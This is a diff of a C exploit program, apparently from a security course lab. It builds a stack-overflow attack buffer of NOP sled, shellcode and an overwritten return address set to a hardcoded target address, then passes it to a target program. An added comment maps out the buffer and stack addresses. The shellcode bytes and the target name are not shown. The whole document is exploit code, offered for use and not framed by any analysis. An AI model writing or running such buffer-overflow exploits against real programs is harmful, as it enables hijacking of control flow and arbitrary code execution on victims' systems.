@@ -8,32 +8,38 @@
 #define BUFFER_SIZE 140
 #define NOP 0x90
 #define TARGET_ADDRESS 0x40a4fe08
+/*
+ *	&buf 		   = 0x40a4fe00
+ *	rip(lab_main)  = 0x40a4fe88
+ *  return address = 0x40a4fe08
+ *
+ *  attack buffer  = [NOP][Shellcode][Return Address]
+ */
 int
 main ( int argc, char * argv[] )
 {
         char *  args[3];
         char *  env[1];
 
-        char attack_buffer[BUFFER_SIZE];
+        char buff[BUFFER_SIZE];
 
         int i;
-
-
         for (i = 0; i < BUFFER_SIZE - strlen(shellcode) - 4; i++)
         {
-                attack_buffer[i] = NOP;
+                buff[i] = NOP;
         }
 
-        char *ptr = attack_buffer + BUFFER_SIZE - strlen(shellcode) - 4;
+        char *ptr = buff + BUFFER_SIZE - strlen(shellcode) - 4;
         for (i = 0; i < strlen(shellcode); i++)
         {
                 ptr[i] = shellcode[i];
         }
+		
 
-        *(unsigned *) & attack_buffer[BUFFER_SIZE - 4] = TARGET_ADDRESS;
+        *(int *) & buff[BUFFER_SIZE - 4] = TARGET_ADDRESS;
 
         args[0] = TARGET;
-        args[1] = attack_buffer;
+        args[1] = buff;
         args[2] = NULL;
 
         env[0] = NULL;
